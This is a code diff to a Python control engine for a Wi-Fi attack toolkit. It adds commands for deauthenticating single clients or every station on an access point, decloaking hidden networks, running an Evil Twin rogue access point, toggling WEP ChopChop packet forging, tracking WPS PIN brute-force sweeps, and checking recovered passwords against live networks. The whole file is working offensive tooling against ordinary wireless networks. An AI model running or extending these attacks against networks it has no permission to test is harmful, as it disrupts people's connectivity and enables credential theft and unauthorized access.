@@ -13,9 +13,15 @@ Commands
     {"cmd": "scan", "seconds": 15}      -> {"event": "network", ...} ... {"event": "scan_done"}
                                            (passive saves arrive as "capture_saved" at any time)
     {"cmd": "targets"}                  -> {"event": "targets", "targets": [{...,"attacks":[...]}]}
-    {"cmd": "attack", "kind": "deauth|pmkid|wps|wep|eviltwin|captive", "bssid": ".."}
+    {"cmd": "attack", "kind": "deauth|pmkid|wps|wep|eviltwin|captive|decloak|known_decloak|"
+                              "verify", "bssid": "..", "options": {...}}
                                         -> {"event": "attack_started"}, attack_log/attack_progress,
                                            then {"event": "attack_done", "ok": .., "summary": ..}
+                                           (verify takes {"value": .., "verify_type": ..})
+    {"cmd": "deauth_client", "bssid": "..", "client": ".."}   -> one deauth burst (TUI's client ✕)
+    {"cmd": "deauth_all", "bssid": ".."}        -> broadcast deauth (TUI's 'd')
+    {"cmd": "silence", "bssid": "..", "on": true}  -> wifi4's silenced list (TUI's 's')
+    {"cmd": "chop", "on": true}                 -> the WEP campaign's ChopChop sub-mode
     {"cmd": "verify_psk", "bssid": "..", "psk": ".."}
                                         -> {"event": "psk_verified", "ok": bool}
     {"cmd": "attack_status"}            -> {"event": "attack_status", "running": bool, ...}
@@ -339,6 +345,8 @@ class Engine:
         self._connecting = None
         # A bounded background retry after usb_waiting; cancelled by usb_lost/stop.
         self._attach_retry = None
+        # One-shot client/broadcast deauth: the TUI's inline ✕ and 'd' hotkey.
+        self._deauth_task = None
 
     async def ping(self):
         emit("ready", version=VERSION, native=bool(os.environ.get("PREFIX")),
@@ -492,7 +500,16 @@ class Engine:
             while self.array is not None:
                 array = self.array
                 changed = []
+                silenced = set()
+                try:
+                    from wifi4.persist.config import Config
+
+                    silenced = {str(item).lower() for item in (Config.silenced_bssids or [])}
+                except Exception:  # noqa: BLE001 - no settings file yet
+                    silenced = set()
                 for bssid, ap in list(pool_access_points(array).items()):
+                    if bssid in silenced:
+                        continue  # silenced: campaigns off and captures ignored
                     signature = self._ap_signature(ap)
                     if self._passive_last.get(bssid) == signature:
                         continue
@@ -602,6 +619,88 @@ class Engine:
                 pass
         emit("usb_detached")
 
+    # ------------------------------------------------- one-shot client actions
+
+    async def deauth_client(self, bssid, client):
+        """One client, one deauth burst: the TUI's inline ✕ on its clients panel."""
+        await self._deauth_once(bssid, client)
+
+    async def deauth_all(self, bssid):
+        """Broadcast deauth every station: the TUI's 'd' hotkey."""
+        await self._deauth_once(bssid, "")
+
+    async def _deauth_once(self, bssid, client):
+        ap = self.ap_for(bssid)
+        if ap is None:
+            emit("error", message="that network is not in the current scan: scan again")
+            return
+        if self.campaign is not None and not self.campaign.done:
+            emit("error", message="an attack is already running")
+            return
+        if self.array is None or self.iface is None:
+            emit("error", message="no adapter: plug in a USB Wi-Fi card")
+            return
+        card = self.array.select_iface(ap.channel)
+        if card is None:
+            emit("error", message=f"no card can reach channel {ap.channel}")
+            return
+        try:
+            async with self.array.lease(channel=ap.channel, iface=card) as iface:
+                if client:
+                    result = await iface.deauth_client(ap.bssid, str(client), rounds=10)
+                    sent, acked = result.total_sent, result.total_acked
+                else:
+                    sent, acked = await iface.deauth_broadcast(ap.bssid, count=20), 0
+        except Exception as exc:  # noqa: BLE001 - a silent client is a normal outcome
+            detail = traceback.format_exc()
+            log(detail)
+            emit("error", message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
+            return
+        emit("deauth_sent", bssid=ap.bssid, ssid=ap.ssid or "", client=str(client or ""),
+             sent=sent, acked=acked)
+
+    async def silence(self, bssid, on):
+        """wifi4's silenced list: campaigns off and captures ignored for that AP (TUI's 's')."""
+        key = str(bssid or "").lower()
+        if not re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", key):
+            emit("error", message="that is not a BSSID")
+            return
+        try:
+            from wifi4.persist.config import Config
+        except Exception as exc:  # noqa: BLE001
+            emit("error", message=f"cannot reach wifi4's settings: {type(exc).__name__}: {exc}")
+            return
+        silenced = [str(item).lower() for item in (Config.silenced_bssids or [])]
+        if on:
+            if key not in silenced:
+                silenced.append(key)
+        else:
+            silenced = [item for item in silenced if item != key]
+        Config.silenced_bssids = silenced
+        emit("silenced", bssid=key, silenced=bool(on))
+        await self.targets()
+
+    async def chop(self, on):
+        """ChopChop: the WEP campaign's packet-forging sub-mode, on or off."""
+        campaign = self.campaign
+        if campaign is None or campaign.done or self.campaign_kind != "wep":
+            emit("error", message="ChopChop needs the WEP campaign running")
+            return
+        if not hasattr(campaign, "start_chop"):
+            emit("error", message="this campaign has no ChopChop")
+            return
+        try:
+            if on:
+                campaign.start_chop()
+            else:
+                campaign.stop_chop()
+        except Exception as exc:  # noqa: BLE001 - a forging failure must not kill the campaign
+            detail = traceback.format_exc()
+            log(detail)
+            emit("error", message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
+            return
+        emit("chop", on=bool(on), active=getattr(campaign, "chop", None) is not None)
+
     async def status(self):
         if self.iface is None:
             emit("status", connected=False, iface=None, access_points=0, band=None,
@@ -706,12 +805,72 @@ class Engine:
             ("pbc", "wifi4.campaigns.pbc", "WpsPbcCampaign"),
             ("eviltwin", "wifi4.campaigns.eviltwin", "EvilTwinCampaign"),
             ("captive", "wifi4.campaigns.eviltwin", "EvilTwinCampaign"),
+            ("decloak", "wifi4.campaigns.decloak", "DecloakCampaign"),
+            ("known_decloak", "wifi4.campaigns.decloak", "KnownDecloakCampaign"),
         ):
             try:
                 registry[kind] = getattr(importlib.import_module(module), name)
             except Exception as exc:  # noqa: BLE001 - reported per campaign, never fatal
                 log(f"attack {kind} unavailable: {type(exc).__name__}: {exc}")
         return registry
+
+    def verify_classes(self):
+        """wifi4's Verify campaigns, keyed by the credential type they check."""
+        registry = {}
+        for kind, module, name in (
+            ("wpa_psk", "wifi4.campaigns.verify.psk", "VerifyPskCampaign"),
+            ("wps_pin", "wifi4.campaigns.verify.pin", "VerifyPinCampaign"),
+            ("wep", "wifi4.campaigns.verify.wep", "VerifyWepCampaign"),
+        ):
+            try:
+                registry[kind] = getattr(importlib.import_module(module), name)
+            except Exception as exc:  # noqa: BLE001 - a missing verifier hides one button
+                log(f"verify {kind} unavailable: {type(exc).__name__}: {exc}")
+        return registry
+
+    def interface_names(self):
+        """The interfaces wifi4 holds: the EvilTwin modal's host/punter selects."""
+        if self.array is None:
+            return []
+        names = []
+        for member in getattr(self.array, "members", None) or []:
+            name = str(getattr(member, "name", "") or "")
+            if name and name not in names:
+                names.append(name)
+        return names
+
+    def client_macs(self, bssid):
+        """The clients the sink has seen on this AP: the target sheet's per-client deauth."""
+        if self.array is None:
+            return []
+        target = str(bssid or "").lower()
+        own = set(getattr(self.array, "forged_macs", ()) or ())
+        macs = []
+        for mac, client in list(getattr(self.array, "clients", {}).items()):
+            if (getattr(client, "bssid", "") or "").lower() != target:
+                continue
+            if mac in own:
+                continue
+            macs.append(str(mac))
+        return sorted(macs)
+
+    def credentials_by_bssid(self):
+        """Saved credentials keyed by BSSID: what the Verify button tests on the live AP."""
+        store = {}
+        for entry in self.credential_entries():
+            bssid = str(entry.get("bssid") or "").lower()
+            if not bssid:
+                continue
+            kind = entry.get("kind")
+            value = str(entry.get("value") or "")
+            pin = str(entry.get("pin") or "")
+            if kind == "wep" and value:
+                store.setdefault(bssid, {"type": "wep", "value": value})
+            elif value:
+                store[bssid] = {"type": "wpa_psk", "value": value}
+            elif pin:
+                store[bssid] = {"type": "wps_pin", "value": pin}
+        return store
 
     def ap_for(self, bssid):
         if self.array is None:
@@ -739,13 +898,25 @@ class Engine:
         if not classes:
             emit("error", message="the wifi4 attack layer is missing from this runtime")
             return
+        interfaces = self.interface_names()
         if self.array is None:
-            emit("targets", count=0, targets=[],
+            emit("targets", count=0, targets=[], interfaces=interfaces,
                  reason="no adapter: plug in a USB Wi-Fi card, scan, then tap the network")
             return
+        try:
+            from wifi4.persist.config import Config
+        except Exception:  # noqa: BLE001 - silenced state is optional
+            Config = None
+        try:
+            credentials = await asyncio.to_thread(self.credentials_by_bssid)
+        except Exception as exc:  # noqa: BLE001 - a missing sidecar must not blank the list
+            log(f"credentials unavailable: {type(exc).__name__}: {exc}")
+            credentials = {}
+        verifies = self.verify_classes()
 
         targets = []
         for bssid, ap in pool_access_points(self.array).items():
+            silenced = bool(Config is not None and Config.is_silenced(bssid))
             attacks = []
             for kind, campaign_cls in classes.items():
                 try:
@@ -755,12 +926,27 @@ class Engine:
                     label = campaign_cls.button_label(ap)
                 except Exception:  # noqa: BLE001 - one odd AP must not blank the whole list
                     continue
+                if kind == "pbc" and not getattr(ap, "wps_pbc_active", False):
+                    # wifi4 has no PBC button: the campaign is armed by an open window only.
+                    reason = reason or "WPS Push-Button window is not open"
+                if silenced:
+                    reason = reason or "AP silenced"
                 attacks.append({
                     "kind": kind,
                     "label": plain(label or campaign_cls.idle_label),
                     "enabled": reason is None,
                     "reason": plain(reason or ""),
                 })
+            credential = credentials.get(bssid)
+            if credential and verifies:
+                reason = "AP silenced" if silenced else ""
+                try:
+                    reason = reason or plain(
+                        next(iter(verifies.values())).ineligible_reason(ap) or "")
+                except Exception:  # noqa: BLE001 - one verifier must not hide the button
+                    reason = reason or ""
+                attacks.append({"kind": "verify", "label": "Verify",
+                                "enabled": not reason, "reason": reason})
             targets.append({
                 "bssid": bssid,
                 "ssid": ap.ssid or "",
@@ -770,11 +956,15 @@ class Engine:
                 "wifi4_encryption": getattr(ap, "encryption", None),
                 "wps": bool(getattr(ap, "wps", False)),
                 "wps_locked": bool(getattr(ap, "wps_locked", False)),
+                "wps_pbc": bool(getattr(ap, "wps_pbc_active", False)),
+                "silenced": silenced,
                 "clients": self.ap_clients(bssid),
+                "clients_list": self.client_macs(bssid),
                 "handshakes": len(getattr(ap, "handshakes", {}) or {}),
+                "credential": credential or {},
                 "attacks": attacks,
             })
-        emit("targets", count=len(targets), targets=targets)
+        emit("targets", count=len(targets), targets=targets, interfaces=interfaces)
 
     def evil_twin_input(self, ap, options):
         """The TUI modal's output, filled with safe defaults for the app's one-card flow.
@@ -799,15 +989,34 @@ class Engine:
         if not members:
             raise ValueError("EvilTwin needs a live adapter")
         members.sort(key=fake_mac_rank)
-        twin = members[0]
+        by_name = {str(getattr(m, "name", "") or ""): m for m in members}
+        twin = by_name.get(str(options.get("twin_iface") or "")) or members[0]
+        punter = by_name.get(str(options.get("punt_iface") or "")) or twin
+        single = len(members) == 1
+        target_bssid = str(ap.bssid or "").lower()
         bssid = str(options.get("twin_bssid") or "").lower()
         if not re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", bssid):
-            last = int(ap.bssid[-1], 16)
-            bssid = ap.bssid[:-1] + format((last + 1) % 16, "x")
+            bssid = ""
         try:
             channel = int(options.get("twin_channel") or ap.channel)
         except (TypeError, ValueError):
             channel = ap.channel
+        if single:
+            # One radio hosts the twin AND punts for it: it cannot leave the target's channel.
+            channel = ap.channel
+        else:
+            try:
+                from wifi4.dot11.chan import is_dfs_channel
+
+                if channel != ap.channel and is_dfs_channel(channel):
+                    raise ValueError("DFS channels need the target's own channel")
+            except ImportError:  # noqa: PERF203 - the band helper is optional
+                pass
+        if not bssid or (bssid == target_bssid and channel == ap.channel):
+            if not single and bssid:
+                raise ValueError("the twin BSSID and channel both match the target: change one")
+            last = int(target_bssid[-1], 16)
+            bssid = target_bssid[:-1] + format((last + 1) % 16, "x")
         modes = []
         if str(options.get("punt", "auto")) != "none":
             selected = options.get("punt_modes")
@@ -821,7 +1030,7 @@ class Engine:
             period = None if period is None else float(period)
         except (TypeError, ValueError):
             period = 30.0
-        return EvilTwinInput(twin_iface=twin, punt_iface=twin, twin_channel=channel,
+        return EvilTwinInput(twin_iface=twin, punt_iface=punter, twin_channel=channel,
                              twin_bssid=bssid, punt_modes=tuple(modes),
                              punt_period_sec=period,
                              punt_once=bool(options.get("punt_once", False)))
@@ -831,11 +1040,20 @@ class Engine:
         if self.campaign is not None and not self.campaign.done:
             emit("error", message="an attack is already running")
             return
+        kind = str(kind or "")
         classes = self.campaign_classes()
-        if not classes:
-            emit("error", message="the wifi4 attack layer is missing from this runtime")
-            return
-        campaign_cls = classes.get(str(kind or ""))
+        if kind == "verify":
+            verifies = self.verify_classes()
+            if not verifies:
+                emit("error", message="the wifi4 verify layer is missing from this runtime")
+                return
+            wanted = str((options or {}).get("verify_type") or "wpa_psk")
+            campaign_cls = verifies.get(wanted) or verifies.get("wpa_psk")
+        else:
+            if not classes:
+                emit("error", message="the wifi4 attack layer is missing from this runtime")
+                return
+            campaign_cls = classes.get(kind)
         if campaign_cls is None:
             emit("error", message=f"unknown attack: {kind}")
             return
@@ -849,13 +1067,21 @@ class Engine:
             emit("error", message="that network is not in the current scan: scan again, then attack")
             return
         try:
+            from wifi4.persist.config import Config
+
+            if Config.is_silenced(ap.bssid):
+                emit("error", message="this AP is silenced: unsilence it on the target sheet first")
+                return
+        except Exception:  # noqa: BLE001 - silencing is optional state, never a blocker
+            pass
+        try:
             # PBC has no button (visible() is False by design): it is armed by the scanner
             # when the AP's Push-Button window is open.
             if kind == "pbc":
                 if not getattr(ap, "wps_pbc_active", False):
                     emit("error", message="WPS Push-Button window is not open")
                     return
-            elif kind not in ("eviltwin", "captive") and not campaign_cls.visible(ap):
+            elif kind not in ("eviltwin", "captive", "verify") and not campaign_cls.visible(ap):
                 emit("error", message=f"{campaign_cls.idle_label} does not apply to this network")
                 return
             reason = campaign_cls.ineligible_reason(ap)
@@ -882,6 +1108,12 @@ class Engine:
                     evil_options["punt"] = "none"
                 evil_input = self.evil_twin_input(ap, evil_options)
                 campaign = campaign_cls(self.array, ap, evil_input=evil_input)
+            elif kind == "verify":
+                value = str((options or {}).get("value") or "")
+                if not value:
+                    emit("error", message="no saved credential for this network")
+                    return
+                campaign = campaign_cls(self.array, ap, value, log=campaign_log)
             else:
                 campaign = campaign_cls(self.array, ap, log=campaign_log)
             started = campaign.run()
@@ -1048,8 +1280,15 @@ class Engine:
             if pin:
                 return {"ok": True, "summary": "WPS PIN found", "detail": str(pin),
                         "keys": [], "pin": str(pin)}
-            tested = getattr(state, "tested", None)
-            return {"ok": False, "summary": "WPS PIN not found", "detail": f"{tested} PINs tried",
+            tested = getattr(state, "tested", 0) or 0
+            phase = str(getattr(state, "phase", "") or "")
+            reason = getattr(campaign, "fail_reason", None)
+            detail = f"{tested:,} PINs tried" + (f" · phase {phase}" if phase else "")
+            if reason:
+                # wifi4's own give-up reason ("AP stopped answering M3", "sweep exhausted", …).
+                return {"ok": False, "summary": "WPS PIN failed",
+                        "detail": f"giving up: {reason} · {detail}", "keys": [], "pin": ""}
+            return {"ok": False, "summary": "WPS PIN not found", "detail": detail,
                     "keys": [], "pin": ""}
         if kind == "pbc":
             outcome = getattr(campaign, "outcome", None)
@@ -1073,6 +1312,33 @@ class Engine:
             return {"ok": captured,
                     "summary": "Evil Twin captured a handshake" if captured else "Evil Twin stopped",
                     "detail": "crackable M2 saved" if captured else "no client joined the twin",
+                    "keys": []}
+        if kind in ("decloak", "known_decloak"):
+            revealed = getattr(campaign, "revealed", None)
+            sent = getattr(campaign, "sent", 0) or 0
+            if revealed:
+                try:
+                    from wifi4.persist.config import Config
+
+                    Config.remember_decloak(getattr(campaign.ap, "bssid", ""), revealed)
+                except Exception:  # noqa: BLE001 - the reveal stands even if the memo fails
+                    pass
+                return {"ok": True, "summary": "SSID revealed", "detail": str(revealed),
+                        "ssid": str(revealed), "keys": []}
+            return {"ok": False, "summary": "SSID not revealed",
+                    "detail": f"no match in {sent} guesses", "keys": []}
+        if kind == "verify":
+            outcome = getattr(campaign, "outcome", None)
+            name = str(getattr(outcome, "name", "") or "") if outcome is not None else ""
+            value = str(getattr(campaign, "value", "") or "")
+            if name == "VERIFIED":
+                return {"ok": True, "summary": "credential verified",
+                        "detail": f"the AP accepted {value}", "keys": [value]}
+            if name == "REJECTED":
+                return {"ok": False, "summary": "credential incorrect",
+                        "detail": f"the AP rejected {value}", "keys": []}
+            return {"ok": False, "summary": "verification failed",
+                    "detail": str(getattr(campaign, "error", None) or "no reply from the AP"),
                     "keys": []}
         if kind == "wep":
             key = getattr(campaign, "recovered_key", None)
@@ -1178,12 +1444,22 @@ class Engine:
             state = getattr(campaign, "state", None)
             pin = getattr(state, "found_pin", None)
             tried = getattr(state, "tested", 0) or 0
+            phase = str(getattr(state, "phase", "") or "common")
+            reason = getattr(campaign, "fail_reason", None)
+            done_common = phase != "common" or bool(pin)
             stages.append(stage("assoc", "Associating with the AP", "done"))
-            stages.append(stage("wps", "WPS exchange", "done" if pin else "active",
-                                f"PIN {pin}" if pin else f"{tried:,} PINs tried"))
-            stages.append(stage("pixie", "Pixie-dust computation",
-                                "done" if pin else "pending"))
+            stages.append(stage("pixie", "Pixie-dust + default PINs",
+                                "done" if done_common else "active",
+                                f"{tried:,} PINs tried" if not done_common else "swept"))
+            if pin:
+                sweep_state, sweep_detail = "done", f"PIN {pin}"
+            elif reason:
+                sweep_state, sweep_detail = "failed", f"giving up: {reason}"
+            else:
+                sweep_state, sweep_detail = "active", f"{min(tried, 11000):,}/11,000"
+            stages.append(stage("sweep", "11k PIN sweep", sweep_state, sweep_detail))
             metrics.append(metric("tried", "PINs TRIED", f"{tried:,}"))
+            metrics.append(metric("phase", "PHASE", phase))
             if pin:
                 metrics.append(metric("pin", "PIN", pin))
         elif kind == "pbc":
@@ -1195,6 +1471,28 @@ class Engine:
             stages.append(stage("wps", "WPS PBC exchange",
                                 "done" if psk else ("failed" if failed else "active"),
                                 f"PSK {psk}" if psk else "waiting for M7"))
+        elif kind in ("decloak", "known_decloak"):
+            revealed = getattr(campaign, "revealed", None)
+            sent = getattr(campaign, "sent", 0) or 0
+            planned = getattr(campaign, "planned", 0) or 0
+            stages.append(stage("probe", "Probing the hidden AP",
+                                "done" if revealed else "active",
+                                f"{sent}/{planned} sent" if planned else f"{sent} sent"))
+            stages.append(stage("ssid", "SSID revealed",
+                                "done" if revealed else "pending",
+                                str(revealed or "waiting for the AP to name itself")))
+        elif kind == "verify":
+            step = str(getattr(campaign, "step", "") or "")
+            outcome = getattr(campaign, "outcome", None)
+            if outcome is None:
+                stages.append(stage("assoc", "Joining the AP", "active", step))
+                stages.append(stage("verify", "Checking the credential", "pending"))
+            else:
+                ok = str(getattr(outcome, "name", "") or "") == "VERIFIED"
+                stages.append(stage("assoc", "Joining the AP", "done", step))
+                stages.append(stage("verify", "Checking the credential",
+                                    "done" if ok else "failed",
+                                    str(getattr(campaign, "error", None) or "")))
         elif kind == "wep":
             key = getattr(campaign, "recovered_key", None)
             samples = 0
@@ -1682,6 +1980,14 @@ async def main():
                                     command.get("options"))
             elif name == "verify_psk":
                 await engine.verify_psk(command.get("bssid"), command.get("psk"))
+            elif name == "deauth_client":
+                await engine.deauth_client(command.get("bssid"), command.get("client"))
+            elif name == "deauth_all":
+                await engine.deauth_all(command.get("bssid"))
+            elif name == "silence":
+                await engine.silence(command.get("bssid"), bool(command.get("on")))
+            elif name == "chop":
+                await engine.chop(bool(command.get("on")))
             elif name == "attack_status":
                 await engine.attack_status()
             elif name == "stop_attack":
